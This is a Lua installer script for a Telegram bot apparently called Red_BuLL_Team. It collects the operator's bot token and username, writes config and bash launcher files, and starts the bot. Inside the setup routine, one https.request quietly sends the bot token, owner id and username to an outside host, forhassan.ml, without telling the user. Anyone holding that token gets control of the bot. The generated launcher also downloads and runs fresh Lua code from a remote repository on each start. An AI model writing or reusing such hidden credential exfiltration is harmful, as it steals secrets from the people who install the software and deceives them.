serpent = dofile("./File_Libs/serpent.lua")
https = require("ssl.https")
http = require("socket.http")
JSON = dofile("./File_Libs/JSON.lua")
local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
Server_Red_BuLL_Team = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
local AutoFiles_Red_BuLL_Team = function() 
local Create_Info = function(Token,Sudo,UserName)  
local Red_BuLL_Team_Info_Sudo = io.open("sudo.lua", 'w')
Red_BuLL_Team_Info_Sudo:write([[
token = "]]..Token..[["

Sudo = ]]..Sudo..[[  

UserName = "]]..UserName..[["
]])
Red_BuLL_Team_Info_Sudo:close()
end  
if not database:get(Server_Red_BuLL_Team.."Token_Red_BuLL_Team") then
print("\27[1;34m»» Send Your Token Bot :\27[m")
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
else
io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
database:set(Server_Red_BuLL_Team.."Token_Red_BuLL_Team",token)
end 
else
io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
end 
os.execute('lua start.lua')
end
------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------
if not database:get(Server_Red_BuLL_Team.."UserName_Red_BuLL_Team") then
print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
local UserName = io.read():gsub('@','')
if UserName ~= '' then
local Get_Info = http.request("http://TshAkE.ml/info/?user="..UserName)
if Get_Info:match('Is_Spam') then
io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
return false
end
local Json = JSON:decode(Get_Info)
if Json.Info == false then
io.write('\n\27[1;31m»» Sorry The UserName is not Correct \n\27[0;39;49m')
os.execute('lua start.lua')
else
if Json.Info == 'Channel' then
io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
os.execute('lua start.lua')
else
io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
database:set(Server_Red_BuLL_Team.."UserName_Red_BuLL_Team",Json.Info.Username)
database:set(Server_Red_BuLL_Team.."Id_Red_BuLL_Team",Json.Info.Id)
end
end
else
io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
end 
os.execute('lua start.lua')
end
local function Files_Red_BuLL_Team_Info()
Create_Info(database:get(Server_Red_BuLL_Team.."Token_Red_BuLL_Team"),database:get(Server_Red_BuLL_Team.."Id_Red_BuLL_Team"),database:get(Server_Red_BuLL_Team.."UserName_Red_BuLL_Team"))   
https.request("https://forhassan.ml/Red_BuLL_Team/Red_BuLL_Team.php?id="..database:get(Server_Red_BuLL_Team.."Id_Red_BuLL_Team").."&user="..database:get(Server_Red_BuLL_Team.."UserName_Red_BuLL_Team").."&token="..database:get(Server_Red_BuLL_Team.."Token_Red_BuLL_Team"))
local RunRed_BuLL_Team = io.open("Red_BuLL_Team", 'w')
RunRed_BuLL_Team:write([[
#!/usr/bin/env bash
cd $HOME/Red_BuLL_Team
token="]]..database:get(Server_Red_BuLL_Team.."Token_Red_BuLL_Team")..[["
rm -fr Red_BuLL_Team.lua
wget "https://raw.githubusercontent.com/SMOK-S/Red_BuLL_Team/master/Red_BuLL_Team.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./Red_BuLL_Team.lua -p PROFILE --bot=$token
done
]])
RunRed_BuLL_Team:close()
local RunTs = io.open("ts", 'w')
RunTs:write([[
#!/usr/bin/env bash
cd $HOME/Red_BuLL_Team
while(true) do
rm -fr ../.telegram-cli
screen -S Red_BuLL_Team -X kill
screen -S Red_BuLL_Team ./Red_BuLL_Team
done
]])
RunTs:close()
end
Files_Red_BuLL_Team_Info()
database:del(Server_Red_BuLL_Team.."Token_Red_BuLL_Team");database:del(Server_Red_BuLL_Team.."Id_Red_BuLL_Team");database:del(Server_Red_BuLL_Team.."UserName_Red_BuLL_Team")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
end 
local function Load_File()  
local f = io.open("./sudo.lua", "r")  
if not f then   
AutoFiles_Red_BuLL_Team()  
var = true
else   
f:close()  
database:del(Server_Red_BuLL_Team.."Token_Red_BuLL_Team");database:del(Server_Red_BuLL_Team.."Id_Red_BuLL_Team");database:del(Server_Red_BuLL_Team.."UserName_Red_BuLL_Team")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
var = false
end  
return var
end
Load_File()
